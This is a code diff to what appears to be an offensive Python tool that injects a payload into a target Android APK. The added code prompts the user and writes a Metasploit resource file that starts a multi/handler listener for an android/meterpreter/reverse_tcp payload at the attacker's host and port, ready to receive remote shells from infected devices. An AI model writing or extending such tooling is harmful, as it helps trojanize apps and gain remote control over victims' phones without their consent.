@@ -63,6 +63,16 @@ def setup_args():
     )
 
     parser.add_argument(
+        '--meterpreter-config', '-m',
+        choices=['Y', 'N'],
+        dest='write_meterpreter_configuration',
+        default=None,
+        type=str.upper,
+        help='Whether or not a meterpreter configuration file should be written.'
+             "It can then be used with 'msfconsole -r config_file'"
+    )
+
+    parser.add_argument(
         '-V', '--verbose',
         dest='verbosity',
         choices=['CRITICAL', 'ERROR', 'WARN', 'INFO', 'DEBUG'],
@@ -109,16 +119,26 @@ def main():
     payload.inject()
     payload.delete()
 
-    print('[ ==== TARGET FINALIZATION ==== ]'.center(120))
+    while args.write_meterpreter_configuration is None:
+        do_write = input(f'{Fore.YELLOW}Would you like to save a meterpreter configuration file? [Y/n] ')
+        print(Style.RESET_ALL, end='', flush=True)
 
-    # apk.build()
+        if do_write == '' or do_write.lower() == 'y':
+            ans = True
+        elif do_write.lower() == 'n':
+            ans = False
+        else:
+            ans = None
+            print(Fore.RED + "Please, input either 'y' or 'n' (case insensitive)" + Style.RESET_ALL)
+        args.write_meterpreter_configuration = ans
 
-    # apk.sign()
-
-    # @phase("Removing target's APK decompilation's results")
-    # def remove_decompiled():
-    #     apk.remove_decompiled()
-
-    # remove_decompiled()
+    if args.write_meterpreter_configuration:
+        with open('meterpreter.rc', 'w') as f:
+            f.write('use exploit/multi/handler\n')
+            f.write('set PAYLOAD android/meterpreter/reverse_tcp\n')
+            f.write(f'set LHOST {args.host.ip}\n')
+            f.write(f'set LPORT {args.host.port}\n')
+            f.write('exploit -j -z\n')
+        print("Configuration written to 'meterpreter.rc'")
 
     print()
